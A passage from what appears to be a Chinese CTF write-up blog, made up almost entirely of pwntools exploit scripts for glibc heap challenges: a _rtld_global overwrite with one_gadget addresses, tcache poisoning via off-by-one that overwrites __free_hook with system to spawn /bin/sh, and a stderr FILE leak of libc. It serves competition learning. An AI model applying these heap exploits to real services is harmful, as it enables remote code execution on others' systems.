class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global2    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(rtld_global - <span class="number">0x31028</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x600</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span> + <span class="number">0x10</span></span><br><span class="line">one_gadget = [<span class="number">0xdf54c</span>, <span class="number">0xdf54f</span>, <span class="number">0xdf552</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span></span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>) <span class="comment"># 0x128</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 279&#x27;)</span></span><br><span class="line"></span><br><span class="line">next_node = rtld_global - <span class="number">0x31028</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(main_arena))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;next_node      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(next_node))</span><br><span class="line"><span class="comment"># print(&#x27;set_context    ---&gt;   &#x27;,hex(set_context))</span></span><br><span class="line"><span class="comment"># print(&#x27;ret            ---&gt;   &#x27;,hex(ret))</span></span><br><span class="line"><span class="comment"># print(&#x27;pop_rdi        ---&gt;   &#x27;,hex(pop_rdi))</span></span><br><span class="line"><span class="comment"># print(&#x27;binsh_addr     ---&gt;   &#x27;,hex(binsh_addr))</span></span><br><span class="line"><span class="comment"># print(&#x27;system_addr    ---&gt;   &#x27;,hex(system_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xdf54c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf54f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf552 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># loadfolder /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/.build-id</span></span><br></pre></td></tr></table></figure>
<h3 id="你满了那我就漫出来了">你满了,那我就漫出来了!</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x88</span>,payload) <span class="comment"># 0 unsortedbin overlap</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload) <span class="comment"># 1 tcachebin poisoning</span></span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 2 trigger chunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x88</span>,payload) <span class="comment"># 3-9 tcachebin 0x88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># chunk0 -&gt; unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 3-9 tcachebin 0xf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">libc_base = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment"># one_gadget = [0x4f2a5, 0x4f302, 0x10a2fc]</span></span><br><span class="line"><span class="comment"># for i in range(len(one_gadget)):</span></span><br><span class="line"><span class="comment">#   one_gadget[i] += libc_base</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) </span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># put chunk8 into tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf0</span>,payload) <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload) <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0x18</span>,payload)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">alloc(<span class="number">13</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive(pre=<span class="string">&quot;ls\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="week4">Week4</h1>
<h2 id="pwn-1">Pwn</h2>
<h3 id="eldenring-final">EldenRing Final</h3>
<p>开学一直没时间打，比赛结束了复现一下这道题，只复现到了 leak stderr
的部分，后面的部分就只是 overlap + fastbin 打 malloc_hook</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看结构体</span></span><br><span class="line">p *(struct _IO_FILE*)_IO_2_1_stderr_</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocPage</span>():</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 生成两个相连的0x20大小的chunk</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletePage</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># free 掉第一个0x20大小的chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocNote</span>(<span class="params">pageID,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27; attach to?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;size:\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;content:\n&gt;\n&#x27;</span>, content)  </span><br><span class="line"><span class="comment"># 生成一个size = 0x20的chunk，再生成一个size &lt;= 0x100的chunk，这里有off-by-one</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteNote</span>(<span class="params">pageID,noteID</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page_ID?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which note_ID would you like to delete?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(noteID))</span><br><span class="line"><span class="comment"># 先 free 掉 后生成的chunk，再 free 掉前生成的chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">is_dbg</span>):</span><br><span class="line">  <span class="keyword">if</span> is_dbg:</span><br><span class="line">    gdb.attach(io,gdbinit)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">name,value</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;   ---&gt;   &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(value)))</span><br><span class="line"></span><br><span class="line">gdbinit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  b *0x400B69</span></span><br><span class="line"><span class="string">  b *0x400B6E</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">  record</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(file)</span><br><span class="line">    <span class="comment"># 归并不能write的chunk</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># off-by-one leak stderr</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xd8</span>,<span class="string">b&#x27;\xd8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\x18&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">13</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;\x68&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x58&#x27;</span></span><br><span class="line">    dbg(<span class="number">1</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">    libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] - <span class="number">0x163</span></span><br><span class="line">    info(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  one_gadget[i] = libc_base + one_gadget[i]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 本题思想：</span></span><br><span class="line">  <span class="comment"># 1. 给结构体申请chunk时，通常会把能write的部分隔离开来，所以我们需要先通过fastbin，把“不能write的部分”放在一起</span></span><br><span class="line">  <span class="comment"># 2. 逆向比较复杂的堆题时，要把每个函数抽象成“对 heap 的操作”，方便理解</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
</search>
